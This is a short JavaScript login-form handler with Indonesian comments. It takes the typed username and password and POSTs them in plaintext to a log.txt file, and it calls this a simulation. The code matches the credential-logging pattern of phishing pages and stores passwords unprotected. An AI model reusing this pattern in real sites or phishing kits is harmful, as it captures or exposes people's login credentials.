document.getElementById("loginForm").addEventListener("submit", function(e) {
  e.preventDefault();

  const user = document.getElementById("username").value;
  const pass = document.getElementById("password").value;

  // Simulasi penyimpanan ke file (khusus Node.js lokal)
  fetch("log.txt", {
    method: "POST",
    body: `${user}:${pass}\n`
  });

  // Feedback
  document.getElementById("message").innerText = "Data berhasil disimpan (simulasi).";
});
